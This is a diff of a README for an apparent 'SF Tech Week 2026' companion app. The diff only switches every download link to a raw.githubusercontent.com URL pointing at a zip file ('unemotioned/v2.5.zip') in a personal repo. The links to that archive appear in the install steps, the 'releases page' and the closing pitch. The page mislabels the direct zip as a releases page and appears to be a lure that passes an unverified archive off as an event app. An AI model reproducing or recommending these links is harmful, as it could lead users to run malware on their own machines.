@@ -5,7 +5,7 @@ description: "Discover 1,713 SF Tech Week events and 36 curated collections acro
 ---
 # 🎉 sf-tech-week-2026 - Your Ultimate SF Tech Week Companion
 
-[![Download Now](https://img.shields.io/badge/Download-SF_Tech_Week_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip)
+[![Download Now](https://img.shields.io/badge/Download-SF_Tech_Week_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip)
 
 ## 🚀 What Is This?
 
@@ -15,7 +15,7 @@ Welcome to the easiest way to navigate San Francisco Tech Week 2026! This handy 
 
 Getting started takes less than two minutes. Here's what you need to do:
 
-1. **Visit this link to download the application:** [https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip](https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip](https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip)
 2. Look for the newest file listed on that page (it will have the highest version number).
 3. Click the download button next to that file.
 4. Once the download finishes, the file will be in your "Downloads" folder.
@@ -149,7 +149,7 @@ Your event preferences and calendar subscriptions are stored locally on your com
 
 We're continuously improving this application. To get the latest features:
 
-- Check the [releases page](https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip) periodically
+- Check the [releases page](https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip) periodically
 - Look for announcements in the application's "What's New" section
 - Follow the repository on GitHub for updates
 
@@ -185,7 +185,7 @@ Remember, with 1,713 events, you can't attend everything. This tool helps you pr
 
 You now have everything you need to conquer SF Tech Week 2026 like a pro. Download the application, explore the collections, build your perfect schedule, and enjoy one of the most exciting weeks in the tech world. With this companion by your side, you'll never miss an opportunity to learn, network, and grow.
 
-**Ready to get started?** Head over to [https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip](https://github.com/FrTim72/frtim72.github.io/raw/refs/heads/main/unemotioned/v2.5.zip) now and grab your copy. See you at Tech Week!
+**Ready to get started?** Head over to [https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip](https://raw.githubusercontent.com/FrTim72/frtim72.github.io/main/unemotioned/v2.5.zip) now and grab your copy. See you at Tech Week!
 
 ---
 
